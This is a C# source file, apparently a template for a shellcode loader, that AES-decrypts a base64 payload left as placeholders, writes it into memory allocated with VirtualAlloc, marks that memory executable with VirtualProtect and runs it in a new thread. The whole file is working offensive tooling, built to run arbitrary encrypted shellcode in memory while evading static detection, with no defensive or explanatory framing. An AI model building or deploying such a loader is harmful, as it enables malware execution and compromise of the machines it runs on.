using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Runner
{
  public class Program {
    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static byte[] StringToByteArray(String hex) {
      int NumberChars = hex.Length;
      byte[] bytes = new byte[NumberChars / 2];
      for (int i = 0; i < NumberChars; i += 2) {
        bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
      }
      return bytes;
    }

    public static void Main(string[] args) {
      string bufEnc = "${BASE64_SHELLCODE}";
      string key = "${KEY}";
      string iv = "${IV}";

      // Decrypt shellcode
      Aes aes = Aes.Create();
      byte[] k = StringToByteArray(key);
      byte[] i = StringToByteArray(iv);
      ICryptoTransform decryptor = aes.CreateDecryptor(k, i);
      byte[] buf;
      using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc))) {
        using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) {
          using (var msPlain = new System.IO.MemoryStream()) {
            csDecrypt.CopyTo(msPlain);
            buf = msPlain.ToArray();
          }
        }
      }

      // Allocate RW space for shellcode
      IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);

      // Copy shellcode into allocated space
      Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

      // Make shellcode in memory executable
      UInt32 lpflOldProtect;
      VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);

      // Execute the shellcode in a new thread
      UInt32 lpThreadId = 0;
      IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);

      // Wait until the shellcode is done executing
      WaitForSingleObject(hThread, 0xffffffff);
    }
  }
}

